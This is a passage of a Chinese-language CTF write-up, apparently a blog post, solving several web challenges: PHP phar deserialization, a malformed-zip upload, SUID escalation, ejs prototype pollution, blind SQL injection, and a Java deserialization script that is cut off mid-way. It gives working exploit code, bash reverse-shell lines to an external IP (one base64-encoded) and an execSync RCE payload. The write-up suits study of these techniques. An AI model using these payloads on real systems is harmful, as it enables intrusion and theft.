<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">55</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"str too long"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
Fatal error<span class="token punctuation">:</span> Uncaught Error<span class="token punctuation">:</span> start in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token punctuation">:</span><span class="token number">80</span> Stack trace<span class="token punctuation">:</span> <span class="token comment">#0 {main} thrown in /var/www/html/index.php on line 80</span>

</code></pre>
<p>链子简单看一下就行</p>
<p><img alt="image-20220522234335262" src="https://img-blog.csdnimg.cn/img_convert/176bafb5b7d8f422114dcd1744bd7fb1.png"/></p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">air</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">tree</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">;</span>
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">;</span>
<span class="token comment">// $d-&gt;act='FilesystemIterator';</span>
<span class="token comment">// $c-&gt;p = $d; </span>
<span class="token comment">// $b-&gt;xxx = $c;</span>
<span class="token comment">// $b-&gt;flag = 'glob:///*f*';</span>
<span class="token comment">// $a-&gt;name = $b;</span>
<span class="token variable">$d</span><span class="token operator">-&gt;</span><span class="token property">act</span><span class="token operator">=</span><span class="token string single-quoted-string">'SplFileObject'</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span> 
<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">xxx</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/fflaggg"</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件,随便新建一个文件内容随意</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>链子末端是个new一个类，打原生类就行，用glob伪协议配合FilesystemIterator类读flag文件名，然后SplFileObject类读文件</p>
<p>主要是有个<code>throw new Error("start");</code>要绕过，不然<code>__destruct()</code>无法触发，链子开头就废了</p>
<p>利用强行<a href="http://blog.m1kael.cn/index.php/archives/14/">GC（ 垃圾处理机制）</a>来触发<code>__destruct</code>方法</p>
<pre><code class="prism language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"tree"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token comment">//或者</span>
a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"tree"</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre>
<p>传值以及生成的phar文件都需要改</p>
<p><img alt="image-20220522235701750" src="https://img-blog.csdnimg.cn/img_convert/c365c0e3599653b759ccbacc3085855c.png"/></p>
<p>生成的phar文件改完还要修sha1校验值</p>
<pre><code class="prism language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 修改内容后的phar文件</span>
s <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token comment"># 获取要签名的数据</span>
h <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment"># 获取签名类型以及GBMB标识</span>
newf <span class="token operator">=</span> s<span class="token operator">+</span>sha1<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>h <span class="token comment"># 数据 + 签名 + 类型 + GBMB</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fixd_phar.phar'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>newf<span class="token punctuation">)</span> <span class="token comment"># 写入新文件</span>
</code></pre>
<p>过滤的是类名，hex绕过不行了，使用gzip压缩phar绕过waf函数过滤，原理详见文章<a href="https://guokeya.github.io/post/uxwHLckwx/">从虎符线下CTF深入反序列化利用</a></p>
<p><img alt="image-20220522235432554" src="https://img-blog.csdnimg.cn/img_convert/55800774af6b892f9071fbcbac8e32cc.png"/></p>
<p>还有一个坑点就是，文件上传容易有编码会变，要urlencode一下</p>
<pre><code class="prism language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">import</span> requests

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fixd_phar.phar.gz'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    ff<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span>
rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://f4d5f70c-40fd-4d98-b794-3172f01132fb.node4.buuoj.cn:81/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'1=a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"w";}i:0;i:0;}&amp;0='</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>ff<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rep<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p><img alt="image-20220522223118406" src="https://img-blog.csdnimg.cn/img_convert/fd04dd7e91cdbc3160e8c200ec718a7f.png"/></p>
<p><img alt="image-20220522223057921" src="https://img-blog.csdnimg.cn/img_convert/c7f4c6007e533bd7f3f5c5cd17904991.png"/></p>
<h2><a id="ezip_377"></a>ezip</h2>
<p>基本逻辑就是只能上传zip，每次上传是不同的子目录（随机数无法爆破），上传文件名有 … 的就被提示hacker 然后上传的zip不能有目录 文件名不能有 …/ 上传zip解压失败也会告知文件目录</p>
<p>上传畸形zip，即解压到一半就失败的zip，进行绕过</p>
<p>压三个php到一个ZIP然后010 Editor 修改最后一个文件名为<code>/</code> 改成系统中不允许的文件名，之前改CRC的办法不行了，php的ZipArchive还是正常解压，改内容的话，整个文件报错 一个文件都出不来</p>
<p><img alt="image-20220527134614510" src="https://img-blog.csdnimg.cn/img_convert/83a155a284591b1a872c92689852b8ae.png"/></p>
<p>上传提示失败就行了 直接弹个shell</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'bash -i &gt;&amp; /dev/tcp/118.xxx.xxx.xxx/7999 0&gt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
<p><img alt="image-20220527135251237" src="https://img-blog.csdnimg.cn/img_convert/57a165011293b4abc4234169fb9e735d.png"/></p>
<p><img alt="image-20220527135509229" src="https://img-blog.csdnimg.cn/img_convert/91a34309df4249f9d9c97233b34613d2.png"/></p>
<p>cat /flag提示无权限，打提权，debian10 内核版本好像没啥能打的洞</p>
<p><img alt="image-20220527135713260" src="https://img-blog.csdnimg.cn/img_convert/384526bf129a11f05eda0be354c25957.png"/></p>
<p>考虑之前新出poc的pkexec提权漏洞 https://github.com/arthepsy/CVE-2021-4034 打一发没反应 pkexec --version 发现压根没装</p>
<p>考虑suid提权</p>
<pre><code class="prism language-bash"><span class="token function">find</span> /bin -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> /usr -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> / -user root -perm -4000 -print <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
</code></pre>
<p>先用前面两命令小范围搜 从根目录开始的话范围太大了 靶机性能没那么强 要搜好久。。。。</p>
<p><img alt="image-20220527140211442" src="https://img-blog.csdnimg.cn/img_convert/bbcd85cda768d35008bc448c5ce6d835.png"/></p>
<p>nl有权限 直接 <code>nl /flag</code> 就行</p>
<p><img alt="image-20220527140318179" src="https://img-blog.csdnimg.cn/img_convert/e932daf16719cf7a279e26d04d7109b2.png"/></p>
<h2><a id="NodeSoEasy_420"></a>NodeSoEasy</h2>
<p>npm查了下源码包依赖的漏洞，啥也没有，最新的<a href="https://security.snyk.io/vuln/SNYK-JS-EJS-2803307">CVE-2022-29078</a>是ejs 3.16的这里是3.17已修复版本</p>
<p>源码很明显一个原型链污染，试了下<code>opts.outputFunctionName</code>那条链子，已经被修复了，加了变量名的校验</p>
<p><img alt="image-20220525144337816" src="https://img-blog.csdnimg.cn/img_convert/714bf9dc87a9d3f682175406174a97a6.png"/></p>
<p>找一下ejs.js里面还有那些src变量拼接的地方</p>
<p><img alt="image-20220525144308567" src="https://img-blog.csdnimg.cn/img_convert/621a5e8237e667dbcfd065f0f3e23554.png"/></p>
<p>网上搜一下看看有没有现成的payload https://www.anquanke.com/post/id/236354 本地调试一下 改一下文章中的payload就行</p>
<p><img alt="image-20220525144629128" src="https://img-blog.csdnimg.cn/img_convert/c86a068e3f7a00e31990b15470f15541.png"/></p>
<p><img alt="image-20220525144655286" src="https://img-blog.csdnimg.cn/img_convert/711b2a72db5736964a07a49d93bad73d.png"/></p>
<p>然后直接postman发包就行</p>
<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span>
    <span class="token string-property property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string-property property">"client"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span> <span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i &gt;&amp; /dev/tcp/118.31.76.240/7999 0&gt;&amp;1\"');"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"compileDebug"</span><span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img alt="image-20220525144238912" src="https://img-blog.csdnimg.cn/img_convert/b528f28e1ac5a94165dec9e7df7faadb.png"/></p>
<p><img alt="image-20220525144147175" src="https://img-blog.csdnimg.cn/img_convert/1fee0e4ee645f943dbfb160db6c8d6cf.png"/></p>
<h2><a id="Really_Easy_SQL_454"></a>Really Easy SQL</h2>
<p>就一个登录界面 输入啥都没反应 查看源码 说是一个钓鱼网站 那应该就是insert注入 纯记录的 布尔盲注不行了 时间盲注即可</p>
<p>给了黑名单，用<code>benchmark(2999999,md5('test'))</code>代替sleep 时间盲注直接梭 空格用 %0a 或者括号包裹代替</p>
<pre><code class="prism language-php"><span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'updatexml'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'by'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'and'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'extractvalue'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sleep'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'alter'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'offset'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sleep'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'case'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hex'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre><code class="prism language-python"><span class="token keyword">import</span> time

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://127.0.0.1//Less-5/?id=1'"</span></span>
string <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,{}-'</span><span class="token punctuation">]</span>
res <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment">#payload = f"username='or(if((ascii(right((select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span>
        <span class="token comment">#payload = f"username='or(if((ascii(right((select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='ctf'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span>
        <span class="token comment">#payload = f"username='or(if((ascii(right((select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='flaggg'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"username='or(if((ascii(right((select%a0group_concat(cmd)%a0from%a0ctf.flaggg),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">))='</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>j<span class="token punctuation">}</span></span><span class="token string">'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span></span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span>
            requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://17fa2a25-fc60-4e0b-937b-18edcec93870.node4.buuoj.cn:81/index.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1.5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span>res
            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>
<p><img alt="image-20220524214720358" src="https://img-blog.csdnimg.cn/img_convert/923439f2aaff06e9260214ca6c0011f3.png"/></p>
<p><img alt="image-20220524220735358" src="https://img-blog.csdnimg.cn/img_convert/01ace8c2e5d74301e60036caf416d877.png"/></p>
<p><img alt="image-20220524230346556" src="https://img-blog.csdnimg.cn/img_convert/2308da0587e9246c162fd4ac2e3e636d.png"/></p>
<h2><a id="easysql_499"></a>easysql</h2>
<p>应该是多了点啥过滤吧，试了下上一题的脚本，还能用，直接梭</p>
<pre><code class="prism language-python"><span class="token keyword">import</span> time

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://127.0.0.1//Less-5/?id=1'"</span></span>
string <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,{}-'</span><span class="token punctuation">]</span>
res <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
        <span class="token comment">#payload = f"username='or(if((ascii(right((select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span>
        <span class="token comment">#payload = f"username='or(if((ascii(right((select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='ctf'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span>
        <span class="token comment">#payload = f"username='or(if((ascii(right((select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='flaggg'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"username='or(if((ascii(right((select%a0group_concat(cmd)%a0from%a0ctf.flaggg),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">))='</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>j<span class="token punctuation">}</span></span><span class="token string">'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit="</span></span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span>
            requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://367c6ac9-727f-4f31-ae4b-890a117a4056.node4.buuoj.cn:81/index.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1.5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span>res
            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>
<h2><a id="EzSerial_528"></a>EzSerial</h2>
<p>登录发现cookie user是base64的，符合加密后序列化的开头特征</p>
<p>直接打cc链没反应，发包一直有setcookie</p>
<p>猜测不在这触发，尝试/user 或者 /admin路由</p>
<p><img alt="image-20220525114345419" src="https://img-blog.csdnimg.cn/img_convert/b2f2b7a9dd8aed839f6876540598926a.png"/></p>
<p><img alt="image-20220525114316424" src="https://img-blog.csdnimg.cn/img_convert/9d34e1f7d05d15455fef33d8a7aec06c.png"/></p>
<p><img alt="image-20220525114332046" src="https://img-blog.csdnimg.cn/img_convert/92bf629afa4102de55d2f2232213205f.png"/></p>
<p>抓包用burp 插件测一下</p>
<p><img alt="image-20220525114528933" src="https://img-blog.csdnimg.cn/img_convert/41ac5cb65cd846f13e9f66ff300b9fe9.png"/></p>
<p>cc5直接打就行，<a href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a>，编码下反弹shell payload</p>
<p><img alt="image-20220525114645273" src="https://img-blog.csdnimg.cn/img_convert/2b132737b986627f2d0dc4e5607e5073.png"/></p>
<p><img alt="image-20220525114104113" src="https://img-blog.csdnimg.cn/img_convert/71490cf8ab21063936705542e0a957a9.png"/></p>
<p>或者直接写脚本盲打</p>
<pre><code class="prism language-python"><span class="token comment">#jdk1.8 win</span>
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> os
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> time

<span class="token comment">#payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']</span>
payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'BeanShell1'</span><span class="token punctuation">,</span><span class="token string">'Click1'</span><span class="token punctuation">,</span><span class="token string">'Clojure'</span><span class="token punctuation">,</span><span class="token string">'CommonsBeanutils1'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections1'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections2'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections3'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections4'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections5'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections6'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections7'</span><span class="token punctuation">,</span><span class="token string">'Groovy1'</span><span class="token punctuation">,</span><span class="token string">'Hibernate1'</span><span class="token punctuation">,</span><span class="token string">'Hibernate2'</span><span class="token punctuation">,</span><span class="token string">'JBossInterceptors1'</span><span class="token punctuation">,</span><span class="token string">'JavassistWeld1'</span><span class="token punctuation">,</span><span class="token string">'Jdk7u21'</span><span class="token punctuation">,</span><span class="token string">'MozillaRhino1'</span><span class="token punctuation">,</span><span class="token string">'MozillaRhino2'</span><span class="token punctuation">,</span><span class="token string">'Myfaces1'</span><span class="token punctuation">,</span><span class="token string">'ROME'</span><span class="token punctuation">,</span><span class="token string">'Spring1'</span><span class="token punctuation">,</span><span class="token string">'Spring2'</span><span class="token punctuation">,</span><span class="token string">'Vaadin1'</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
	command <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'java8 -jar ysoserial.jar '</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">' "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMzEuNzYuMjQwLzc5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}" &gt; '</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">'.txt'</span><span class="token punctuation">)</span>
	command<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
	cmd <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'certutil -f -encode '</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">'.txt '</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">'_encode.txt'</span><span class="token punctuation">)</span>
